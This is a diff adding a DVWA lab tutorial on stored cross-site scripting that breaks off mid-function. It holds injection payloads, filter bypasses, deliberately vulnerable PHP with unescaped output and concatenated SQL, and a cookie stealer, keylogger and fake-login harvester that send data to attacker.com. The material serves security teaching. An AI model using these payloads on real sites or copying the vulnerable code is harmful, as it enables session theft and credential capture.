@@ -1,0 +1,164 @@
+
+## **📂 DVWA/XSS/stored-xss.md**
+```markdown
+# 💾 Stored XSS (Persistent)
+
+## 🎯 Target Application
+Guestbook/message board where user input is stored in database and displayed to all visitors.
+
+## 📋 Vulnerability Description
+Stored XSS occurs when malicious scripts are permanently stored on the server (in database, file system, etc.) and executed whenever the content is displayed.
+
+## ⚡ Exploitation Chain
+
+Attacker → Input malicious script → Script stored in DB → Victim visits page → Script executes → Attack successful
+
+
+## 🎯 Attack Vectors
+
+### 1. Guestbook/Message Board
+
+<!-- Malicious comment -->
+Great site! <script>stealCookies()</script>
+
+
+2. User Profiles
+
+<!-- Malicious profile field -->
+Bio: <img src=x onerror="maliciousCode()">
+
+
+3. Product Reviews
+
+<!-- Malicious review -->
+5 stars! <iframe src="javascript:alert('XSS')"></iframe>
+
+
+4. File Uploads
+
+<!-- Malicious SVG file -->
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS')"></svg>
+📊 Payload Examples
+Basic Persistent Payloads
+html
+<script>alert('Stored XSS')</script>
+<img src=x onerror="alert('XSS')">
+<iframe src="javascript:alert('XSS')"></iframe>
+
+
+Cookie Stealer (Persistent)
+
+<script>
+    // Send cookies to attacker server every time page loads
+    var img = new Image();
+    img.src = 'http://attacker.com/collect?cookie=' + encodeURIComponent(document.cookie) + '&page=' + encodeURIComponent(document.location);
+</script>
+Keylogger (Persistent)
+html
+<script>
+    // Persistent keylogger
+    document.onkeypress = function(e) {
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', 'http://attacker.com/log', true);
+        xhr.send('key=' + String.fromCharCode(e.keyCode));
+    };
+</script>
+
+
+Credential Harvester
+
+<!-- Fake login form overlay -->
+<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:9999;">
+    <div style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);background:white;padding:20px;">
+        <h3>Session Expired - Please Re-login</h3>
+        <form onsubmit="stealCredentials()">
+            <input type="text" id="username" placeholder="Username"><br>
+            <input type="password" id="password" placeholder="Password"><br>
+            <button type="submit">Login</button>
+        </form>
+    </div>
+</div>
+<script>
+    function stealCredentials() {
+        var user = document.getElementById('username').value;
+        var pass = document.getElementById('password').value;
+        fetch('http://attacker.com/steal', {
+            method: 'POST',
+            body: 'user=' + user + '&pass=' + pass
+        });
+        return false;
+    }
+</script>
+
+
+🔍 Security Level Analysis
+
+
+Low Security
+
+// Direct output without sanitization
+$message = $_POST['mtxMessage'];
+$name = $_POST['txtName'];
+
+// Store in database
+$query = "INSERT INTO guestbook (comment, name) VALUES ('$message', '$name')";
+// Later display without encoding
+echo "<div class='comment'>$message</div>";
+Impact: Complete compromise, affects all visitors
+
+Medium Security
+
+// Basic filtering
+$message = str_replace('<script>', '', $_POST['mtxMessage']);
+$message = str_replace('</script>', '', $message);
+// Still vulnerable to other tags
+Bypass Techniques:
+
+<img src=x onerror=alert('XSS')>
+<svg onload=alert('XSS')>
+<body onload=alert('XSS')>
+
+High Security
+
+// Better filtering but might have loopholes
+$message = preg_replace('/<.*?>/', '', $_POST['mtxMessage']);
+// Could bypass with JavaScript URIs
+Advanced Bypasses:
+
+<a href="javascript:alert('XSS')">Click</a>
+<input onfocus=alert('XSS') autofocus>
+
+
+🛡️ Prevention Strategies
+
+
+1. Input Validation (Server-side)
+
+// Strict whitelist validation
+function validateInput($input, $maxLength = 1000) {
+    // Check length
+    if (strlen($input) > $maxLength) {
+        return false;
+    }
+    
+    // Allow only safe characters (customize as needed)
+    if (!preg_match('/^[a-zA-Z0-9\s.,!?@#%&*()\-_+=:;"\']+$/', $input)) {
+        return false;
+    }
+    
+    // Check for suspicious patterns
+    $suspiciousPatterns = [
+        '/<script/i',
+        '/javascript:/i',
+        '/on\w+\s*=/i',
+        '/data:/i',
+        '/vbscript:/i'
+    ];
+    
+    foreach ($suspiciousPatterns as $pattern) {
+        if (preg_match($pattern, $input)) {
+            return false;
+        }
+    }
+    
+    return
